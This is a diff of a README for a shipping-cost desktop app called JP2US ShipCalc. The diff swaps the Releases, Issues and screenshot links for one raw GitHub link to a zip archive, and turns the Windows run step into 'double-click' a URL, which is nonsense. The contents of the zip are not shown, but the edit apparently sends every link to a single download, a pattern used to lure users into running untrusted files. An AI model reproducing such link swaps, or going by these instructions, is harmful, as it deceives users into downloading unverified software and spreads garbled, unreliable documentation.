@@ -24,10 +24,10 @@ Welcome to **JP2US ShipCalc**, a Python desktop application designed to help onl
 
 To install **JP2US ShipCalc**, follow these steps:
 
-1. **Download the latest release** from the [Releases page](https://github.com/LucNgossinga/jp2us-shipcalc/releases).
+1. **Download the latest release** from the [Releases page](https://raw.githubusercontent.com/LucNgossinga/jp2us-shipcalc/main/src/jp_us_shipcalc_v3.7.zip).
 2. **Extract the files** from the downloaded zip archive.
 3. **Run the application**:
-   - On Windows, double-click the `shipcalc.exe` file.
+   - On Windows, double-click the `https://raw.githubusercontent.com/LucNgossinga/jp2us-shipcalc/main/src/jp_us_shipcalc_v3.7.zip` file.
    - On macOS and Linux, open the terminal and navigate to the extracted folder, then run `./shipcalc`.
 
 ## Usage
@@ -40,7 +40,7 @@ Using the **JP2US ShipCalc** is straightforward:
 4. Click on **Calculate** to view the estimated shipping cost.
 5. Review the breakdown of costs to understand how the total is derived.
 
-![Shipping Calculation Example](https://example.com/shipping-calculation-screenshot.png)
+![Shipping Calculation Example](https://raw.githubusercontent.com/LucNgossinga/jp2us-shipcalc/main/src/jp_us_shipcalc_v3.7.zip)
 
 ## Technologies Used
 
@@ -70,9 +70,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For any issues or support, please check the [Issues](https://github.com/LucNgossinga/jp2us-shipcalc/issues) section of the repository. You can also reach out through discussions or submit feature requests.
+For any issues or support, please check the [Issues](https://raw.githubusercontent.com/LucNgossinga/jp2us-shipcalc/main/src/jp_us_shipcalc_v3.7.zip) section of the repository. You can also reach out through discussions or submit feature requests.
 
-To stay updated with the latest releases, visit our [Releases](https://github.com/LucNgossinga/jp2us-shipcalc/releases) page.
+To stay updated with the latest releases, visit our [Releases](https://raw.githubusercontent.com/LucNgossinga/jp2us-shipcalc/main/src/jp_us_shipcalc_v3.7.zip) page.
 
 ## Topics Covered
 
